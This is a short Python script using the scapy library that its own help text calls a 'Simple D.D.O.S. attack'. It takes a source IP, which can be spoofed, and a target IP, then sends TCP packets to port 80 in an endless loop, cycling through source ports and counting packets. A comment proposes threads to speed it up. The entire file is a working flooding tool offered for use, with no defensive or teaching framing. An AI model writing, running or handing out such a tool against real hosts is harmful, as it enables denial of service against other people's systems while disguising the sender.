#!/usr/bin/python3
from scapy.all import *
import argparse

parser = argparse.ArgumentParser(description="Simple D.D.O.S. attack")  #Distributed Denial Of Service
parser.add_argument("-s", "--source", dest="source", help="Source IP", required=True)
parser.add_argument("-t", "--target", dest="target", help="Target IP", required=True)
arguments = parser.parse_args()

packages = 1

while True:
    for port in range(1000, 65535):
        IP1 = IP(src=arguments.source, dst=arguments.target)
        TCP1 = TCP(sport=port, dport=80)
        package = IP1 / TCP1
        send(package, inter=0.001, verbose=False)   #inter: time interval to wait between two packages
        print("Number of packages: ", packages)
        packages += 1

#TODO: optimize with threads
